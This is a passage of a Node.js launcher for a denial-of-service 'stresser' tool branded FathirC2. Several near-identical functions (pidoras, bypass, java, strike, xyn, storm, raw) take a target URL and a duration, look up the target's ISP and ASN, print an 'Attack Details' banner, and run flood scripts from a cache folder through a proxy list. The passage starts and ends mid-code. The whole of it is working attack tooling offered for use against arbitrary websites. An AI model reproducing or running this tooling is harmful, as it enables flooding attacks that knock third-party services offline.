⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/7`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function pidoras(args) {
  if (args.length < 3) {
    console.log(`Example: .pidoras <target> <port>  <duration>
pidoras https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m pidoras \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/8`);
exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
sigma()
};
// [========================================] //
async function bypass(args) {
  if (args.length < 3) {
    console.log(`Example: .bypass <target> <port>  <duration>
bypass https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m bypass \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/9`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function java(args) {
  if (args.length < 3) {
    console.log(`Example: .java <target> <port>  <duration>
java https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m java \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/10`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function strike(args) {
  if (args.length < 3) {
    console.log(`Example: .strike <target> <port>  <duration>
strike https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m strike \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/11`);
exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
sigma()
};
// [========================================] //
async function xyn(args) {
  if (args.length < 3) {
    console.log(`Example: .xyn <target> <port>  <duration>
xyn https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m xyn \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/12`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function storm(args) {
  if (args.length < 3) {
    console.log(`Example: .storm <target> <port>  <duration>
storm https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m storm \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/13`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function raw(args) {
  if (args.length < 3) {
    console.log(`Example: .raw <target> <port>  <duration>
raw https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
